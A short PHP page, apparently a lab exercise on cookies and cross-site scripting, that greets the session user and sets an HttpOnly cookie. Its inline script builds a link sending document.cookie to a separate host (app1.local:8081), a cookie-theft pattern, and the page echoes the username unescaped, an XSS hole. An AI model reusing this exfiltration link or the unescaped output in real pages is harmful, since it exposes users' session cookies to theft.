<?php

echo "<br/>";
include ('header.php');
include ('session.php');

$time = (new DateTime())->getTimestamp();

echo PHP_EOL. "Welcome to User.php" . PHP_EOL;

echo "<br/>";
$userName = $_SESSION['username'] ?? null;
echo "Hi $userName you in User page." . PHP_EOL;
echo "<br/>";

setcookie("USER_TIME", $time, httponly:true, secure: true);

$javascripts = <<<JS
<script>

document.cookie = "xxs=Dylan";

var link = "http://app1.local:8081/?cookie=" + document.cookie;
var element = document.createElement("a");
element.setAttribute("href", link);
element.innerHTML = "your text";

// and append it to where you'd like it to go:
document.body.appendChild(element);

</script>
JS;

echo $javascripts;
